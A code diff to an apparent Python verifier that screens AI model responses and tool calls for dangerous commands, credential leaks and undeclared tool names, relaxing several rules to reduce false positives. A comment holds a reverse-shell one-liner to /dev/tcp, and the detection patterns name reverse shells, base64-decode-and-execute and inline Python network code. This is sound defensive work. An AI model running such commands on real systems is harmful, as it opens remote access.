@@ -158,7 +158,17 @@ _BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
     #     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
     (r"/dev/(?:tcp|udp)/[\w.:-]+", "反弹 shell（内建 /dev/tcp 重定向）"),
     (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^\n]*&", "反弹 shell（交互式 shell 重定向）"),
-    (r"\bpython\s+-c\b[^\n]*(?:socket|subprocess|os\.system)", "Python 内联执行危险操作"),
+    # ★★ 2026-10-28（误报修复，日志 #7496 / #7515）：
+    #   旧判据是「python -c + (socket|subprocess|os.system)」即 high。
+    #   但 `python -c "import subprocess; subprocess.run(['git', ...])"`
+    #   正是编程助手跑一次性检查的标准写法 —— 实测两次中断正常对话。
+    #   真正危险的不是「用了 subprocess」，而是内联代码里出现
+    #   **网络原语或动态求值**：那才是把回答变成投递通道的形态。
+    #   破坏性命令（rm -rf / dd / mkfs）仍由上面的独立规则命中。
+    (r"\bpython[23]?\s+-c\b[^\n]*(?:socket\.|urlopen|urllib|"
+     r"http\.client|requests\.(?:get|post|put|patch)|httpx\.|"
+     r"exec\s*\(|eval\s*\()",
+     "Python 内联执行网络/动态代码"),
     (r"\bbase64\s+-d\b[^\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
 ]
 
@@ -290,6 +300,42 @@ def _args_are_content(tool_name: str, args_text: str) -> bool:
     return False
 
 
+def _is_pattern_mention(text: str, m: "re.Match") -> bool:
+    """这次敏感路径命中是「被当成模式/关键字提到」，还是「真要去读」。
+
+    ★★ 2026-10-28 实测（日志 #7496 / #7928）：
+      被判「试图读取 .env」的两条 Shell 命令，实际都是**过滤条件**：
+        for k in ('XD_1','企业版','.env','key','pem','.db','.log'):  ...
+        ... -match 'pem|token|secrets|\\.env|\\.db|\\.log' ...
+      `.env` 在这些位置只是「要找哪些文件」的关键字，一个字节都没被读出。
+      旧判据只看「参数里出现了 .env 字样」，于是一次仓库体检就被打断 ——
+      而这恰恰是编程助手被叫来干的活。
+
+    判据（只看紧邻字符与所在位置的引号，不做全文语义推断）：
+      · 紧邻字符是正则转义 `\\` / 交替符 `|` / 量词 `? * +` → 是模式；
+      · 引号包裹的短字面量，且左右两侧都是列表分隔符
+        （`('a','b','.env')` 这种并列清单）→ 是关键字。
+      真正的读取（`cat .env`、`Get-Content .env`、`Read .env`）
+      两条都不满足，仍然按高危处理。
+    """
+    start, end = m.span()
+    before = text[start - 1:start]
+    after = text[end:end + 1]
+    if before in ("\\", "|") or after in ("|", "?", "*", "+"):
+        return True
+
+    quote = before
+    if quote in ("'", '"') and after == quote:
+        # 引号完整包裹的短字面量：两侧同为分隔符才是「并列清单里的元素」
+        #   ('XD_1','企业版','.env','key')  → 左 , 右 ,   → 关键字清单
+        #   {"file_path": ".env"}           → 左 : 右 }   → 独立路径值
+        #   cat ".env"                      → 左 空格      → 独立路径值
+        pre = text[:start - 1].rstrip()
+        post = text[end + 1:].lstrip()
+        if pre[-1:] in ("(", "[", ",", "{") and post[:1] in (",", ")", "]", "}"):
+            return True
+    return False
+
 
 def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
     """检测 tool call 中的危险参数。
@@ -373,6 +419,22 @@ def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
             m = pattern.search(args_text)
             if m and f"path:{m.group(0)}" not in seen_commands:
                 seen_commands.add(f"path:{m.group(0)}")
+                # ★★ 2026-10-28：路径出现在正则/关键字清单里 ≠ 要去读它。
+                #   见 _is_pattern_mention —— 这类命中只记录，不阻断。
+                if _is_pattern_mention(args_text, m):
+                    findings.append(
+                        VerificationFinding(
+                            category="dangerous_content",
+                            severity="medium",
+                            detail=(
+                                f'Tool Call "{tool_name}" 的参数里把'
+                                f"「{label} {m.group(0)[:40]}」当作匹配条件使用"
+                                "（是正则/关键字清单，不是文件操作；仅作记录，不阻断）"
+                            ),
+                            evidence=_mask_evidence(args_text, m.start()),
+                        )
+                    )
+                    continue
                 # ★ 见 _args_are_content：只有「会读文件 / 会执行命令」且
                 #   不是写消息命令时，参数里的敏感路径才构成读取行为。
                 if _args_are_content(tool_name, args_text):
@@ -942,6 +1004,43 @@ def _structure_distance(a: str, b: str) -> float:
 # ══════════════════════════════════════════════════════════════
 
 
+def _demote_undeclared_without_danger(findings: List[VerificationFinding]) -> None:
+    """「未声明的工具名」在没有危险动作伴随时只记录，不阻断。
+
+    ★★ 2026-10-28 实测（日志 #7336 / #7374）：
+      客户端把「跑命令」拆成了好几个工具名（Shell / RunCommand /
+      CheckCommandStatus / ReadCommandOutput…），而请求里声明的只有其中
+      一部分。模型返回另一个阶段的工具名时，旧判据按 high 直接阻断，
+      一早上打断了两次正常对话。
+
+      这两条为什么不能算「凭空造调用」：
+        · 客户端的工具名映射是**客户端自己**定的，中转站造一个它不认识
+          的名字，客户端根本不会执行（拿不到 handler）—— 没有可执行面；
+        · 真正的伤害必须落在「参数里有危险动作」上，而那是
+          tool_call_dangerous 的判据，不是这一条。
+
+      所以口径改为：
+        · 未声明 + 本轮**没有**高危工具参数 → medium（记录、可解释）；
+        · 未声明 + 本轮**有**高危工具参数  → 保持 high（一并阻断）。
+      名字族已在 baseline._TOOL_FAMILIES 里显式枚举，别名不会走到这里。
+    """
+    if not findings:
+        return
+    has_danger = any(
+        f.category == "tool_call_dangerous" and f.severity == "high"
+        for f in findings
+    )
+    if has_danger:
+        return
+    for f in findings:
+        if f.category == "undeclared_tool" and f.severity == "high":
+            f.severity = "medium"
+            f.detail += (
+                "（本轮参数中没有出现危险动作，客户端也不会执行自己不认识的工具名；"
+                "仅作记录，不阻断）"
+            )
+
+
 def decide_response_action(
     level: str, findings: List[Any]
 ) -> Tuple[str, str]:
@@ -1128,7 +1227,13 @@ class ResponseVerifier:
         #   而中转站的演化方向是不含任何被禁词 —— 实测 9/13 绕过。
         #   这一类的判据来源是请求本身，不依赖被评判的模型，
         #   因此不存在循环论证。
-        findings.extend(self._check_against_baseline(content, payload, baseline))
+        baseline_findings = self._check_against_baseline(content, payload, baseline)
+        # ★ 2026-10-28：「未声明工具名」只有与高危工具参数同时出现才阻断，
+        #   见 _demote_undeclared_without_danger。必须在汇总前降级，
+        #   否则 decide_response_action 取到的最大值仍是 high。
+        #   传入的是**合并视图**：高危工具参数由 ① 产生，不在 baseline 列表里。
+        _demote_undeclared_without_danger(findings + baseline_findings)
+        findings.extend(baseline_findings)
 
         if not findings:
             return VerifyResult(action=Action.PASS.value, severity="low")
@@ -1196,6 +1301,28 @@ class ResponseVerifier:
             f"内容检查：{reason}" if reason
             else "内容检查命中风险内容"
         )
+
+        if category == "sensitive_leak":
+            # ★★ 2026-10-28（日志 #8470 复核）：这一类**维持 high / 阻断**。
+            #
+            #   判据是「回答正文里出现了真实凭证形态」（sk- / AKIA / PEM / JWT，
+            #   见 _SENSITIVE_LEAK_RE，带左边界，普通英文复合词不会命中）。
+            #   与 content_policy 的区别正在这里：那是模型说敏感词，
+            #   这是模型把**凭证本体**吐了出来 —— 无论来源是你的还是它的，
+            #   都该立刻让你知道，而不是静默放过。
+            #
+            #   复核过程：当天同一 reason（「输出内容命中高危违规模式」）
+            #   的 #7530 被判成 content_policy（只记录），#8470 却是
+            #   sensitive_leak —— 唯一差异只能是正文里命中了凭证正则。
+            #   因此这一条不是误报，是判据本身在起作用。
+            #
+            #   但原本文案是「内容检查：输出内容命中高危违规模式，已拦截」——
+            #   用户看不出「哪里出了问题」。这里换成人话，并给出处置建议。
+            detail = (
+                "回答正文里出现了密钥/令牌形态的字样（已打码显示）。"
+                "这可能是模型复述了你贴过的凭证，也可能是它自己编的示例；"
+                "请核对是否真实 —— 若真实，请立即更换该凭证。"
+            )
 
         findings.append(
             VerificationFinding(
